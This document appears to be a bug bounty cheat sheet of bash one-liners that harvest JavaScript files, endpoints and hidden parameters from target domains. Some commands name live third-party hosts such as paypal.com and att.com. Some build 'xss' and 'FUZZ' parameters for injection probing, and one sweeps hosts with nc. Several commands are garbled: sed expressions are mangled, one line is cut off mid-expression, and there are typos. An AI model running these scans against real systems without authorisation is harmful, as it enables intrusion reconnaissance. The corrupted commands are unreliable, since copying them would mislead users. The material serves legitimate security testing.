# search javascript file
gau -subs DOMAIN | grep -iE '\.js'|grep -iEv '(\.jsp|\.json)' >> js.txt
```
```bash
# Find JavaScript Files
assetfinder --subs-only HOST | gau | egrep -v '(.css|.png|.jpeg|.jpg|.svg|.gif|.wolf)' | while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Zo-9_]+" | sed -e 's, 'var','"$url"?',g' -e 's/ //g' | grep -v '.js' | sed 's/.*/&=xss/g'):echo -e "\e[1;33m$url\n" "\e[1;32m$vars"; done
```
```bash
# Extract Endpoints from JavaScript
cat FILE.js | grep -oh "\"\/[a-zA-Z0-9_/?=&]*\"" | sed -e 's/^"//' -e 's/"$//' | sort -u
```
```bash
# Extract endpoints from JS (Part 1)
curl -L -k -s https://www.example.com | tac | sed "s**\\/**/**" | egrep -o "src['\"]?\s*[=:]\s*['\"]?[^'\"]+.js[^'\"> ]*" | awk -F '//' '{if(length($2))print "https://"$2}' | sort -fu | xargs -I '%' sh -c "curl -k -s \"%\" | sed \"s/[;}\)>]/\n/g\" | grep -Po \"(['\\\"](https?:)?[/]{1,2}[^'\\\"> ]{5,})|(\.(get|post|ajax|load)\s*\(\s*['\\\"](https?:)?[/]{1,2}[^'\\\"> ]{5,})\"" | awk -F "['\"]" '{print $2}' | sort -fu
```
```bash
# Extract endpoints from JS (Part 2)
curl -Lks https://example.com | tac | sed "s**\\/**/**" | egrep -o "src['\"]?\s*[=:]\s*['\"]?[^'\"]+.js[^'\"> ]*" | sed -r "s/^src['\"]?[=:]['\"]//g" | awk -v url=https://example.com '{if(length($1)) if($1 ~/^http/) print $1; else if($1 ~/^\/\//) print "https:"$1; else print url"/"$1}' | sort -fu | xargs -I '%' sh -c "echo \"\n**%\";wget --no-check-certificate --quiet \"%\"; basename \"%\" | xargs -I \"**" sh -c 'linkfinder.py -o cli -i **"
```
```bash
# Extract endpoints from JS (Part 3)
curl -Lks https://example.com | tac | sed "s**\\/**/**" | egrep -o "src['\"]?\s*[=:]\s*['\"]?[^'\"]+.js[^'\"> ]*" | sed -r "s/^src['\"]?[=:]['\"]//g" | awk -v url=https://example.com '{if(length($1)) if($1 ~/^http/) print $1; else if($1 ~/^\/\//) print "https:"$1; else print url"/"$1}' | sort -fu | xargs -I '%' sh -c "echo \"\n**%\";wget --no-check-certificate --quiet \"%\";curl -Lks \"%\" | sed \"s/[;}\)>]/\n/g\" | grep -Po \"('***)|(['\\\"](https?:)?[/]{1,2}[^'\\\"> ]{5,})|(\.(get|post|ajax|load)\s*\(\s*['\\\"](https?:)?[/]{1,2}[^'\\\"> ]{5,})\" | sort -fu" | tr -d "'\""
```
```bash
# Extract endpoints from JS (Part 4)
curl -Lks https://example.com | tac | sed "s**\\/**/**" | egrep -o "src['\"]?\s*[=:]\s*['\"]?[^'\"]+.js[^'\"> ]*" | sed -r "s/^src['\"]?[=:]['\"]//g" | awk -v url=https://example.com '{if(length($1)) if($1 ~/^http/) print $1; else if($1 ~/^\/\//) print "https:"$1; else print url"/"$1}' | sort -fu | xargs -I '%' sh -c "echo \"'**%\";curl -k -s \"%\" | sed \"s/[;}\)>]/\n/g\" | grep -Po \"('***)|(['\\\"](https?:)?[/]{1,2}[^'\\\"> ]{5,})|(\.(get|post|ajax|load)\s*\(\s*['\\\"](https?:)?[/]{1,2}[^'\\\"> ]{5,})\" | sort -fu" | tr -d "'\""
```
```bash
# Using chaos search js
chaos -d att.com | httpx -silent | xargs -I@ -P20 sh -c 'gospider -a -s "@" -d 2' | grep -Eo "(http|https)://[^/"].*.js+" | sed "s**
```
```bash
# Collect js files from hosts up by gospider
xargs -P 500 -a pay -I@ sh -c 'nc -w1 -z -v @ 443 2>/dev/null && echo @' | xargs -I@ -P10 sh -c 'gospider -a -s "https://@" -d 2 | grep -Eo "(http|https)://[^/\"].*\.js+" | sed "s**] \- **n**" | anew'
```
```bash
# Search JS to domains file.
cat FILE TO TARGET | httpx -silent | subjs | anew
```
```bash
# Search JS using assetfinder, rush and hakrawler.
assetfinder -subs-only paypal.com -silent | httpx -timeout 3 -threads 300 --follow-redirects -silent | rush 'hakrawler -plain -linkfinder -depth 5 -url {}' | grep "paypal"
```
```bash
# Search to js using hakrawler and rush & unew
cat hostsGospider | rush -j 100 'hakrawler -js -plain -usewayback -depth 6 -scope subs -url {} | unew hakrawlerHttpx'
```
```bash
# Extract all javascript links from a domain using gau and grep
echo domain | gau | grep -Eo "https?://\S+?\.js" 
```
```bash
# Search .js using
assetfinder -subs-only DOMAIN -silent | httpx -timeout 3 -threads 300 --follow-redirects -silent | xargs -I% -P10 sh -c 'hakrawler -plain -linkfinder -depth 5 -url %' | awk '{print $3}' | grep -E "\.js(?:onp?)?$" | anew
```
```bash
# Find JS Files
assetfinder site.com | gau|egrep -v '(.css|.png|.jpeg|.jpg|.svg|.gif|.wolf)'|while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Zo-9_]+" |sed -e 's, 'var','"$url"?',g' -e 's/ //g'|grep -v '.js'|sed 's/.*/&=xss/g'):echo -e "\e[1;33m$url\n" "\e[1;32m$vars";done
```
```bash
cat main.js | grep -oh "\"\/[a-zA-Z0-9_/?=&]*\"" | sed -e 's/^"//' -e 's/"$//' | sort -u
# Extract Endpoints from JS File
```
```bash
# Find JS Files
cat target.txt | (gau || hakrawler || waybackurls || katana) | grep -i -E "\.js" | egrep -v "\.json|\.jsp" | anew js.txt
```
```bash
while read -r url; do
  if curl -s -o /dev/null -w "%{http_code}" "$url" | grep -q 200 && \
     curl -s -I "$url" | grep -iq 'Content-Type:.*\(text/javascript\|application/javascript\)'; then
    echo "$url"
  fi
done < urls.txt > js.txt
```
```bash
# Hidden Params in JS
cat subs.txt | (gau || hakrawler || waybackurls || katana) | sort -u | httpx -silent -threads 100 | grep -Eiv '(.eot|.jpg|.jpeg|.gif|.css|.tif|.tiff|.png|.ttf|.otf|.woff|.woff2|.ico|.svg|.txt|.pdf)' | while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Z0-9]+" | sed -e 's,'var','"$url"?',g' -e 's/ //g' | grep -Eiv '\.js$|([^.]+)\.js|([^.]+)\.js\.[0-9]+$|([^.]+)\.js[0-9]+$|([^.]+)\.js[a-z][A-Z][0-9]+$' | sed 's/.*/&=FUZZ/g'); echo -e "\e[1;33m$url\e[1;32m$vars";done
```
```bash
# Extract sensitive end-point in JS
cat main.js | grep -oh "\"\/[a-zA-Z0-9_/?=&]*\"" | sed -e 's/^"//' -e 's/"$//' | sort -u
```
```bash
# Extract path to js
cat file.js | grep -aoP "(?<=(\"|\'|\`))\/[a-zA-Z0-9_?&=\/\-\**.]*(?=(\"|\'|\`))" | sort -u 
```
```bash
# Find Endpoints in JS
katana -u http://testphp.vulnweb.com -js-crawl -d 5 -hl -filed endpoint | anew endpoint.txt
```
</details>
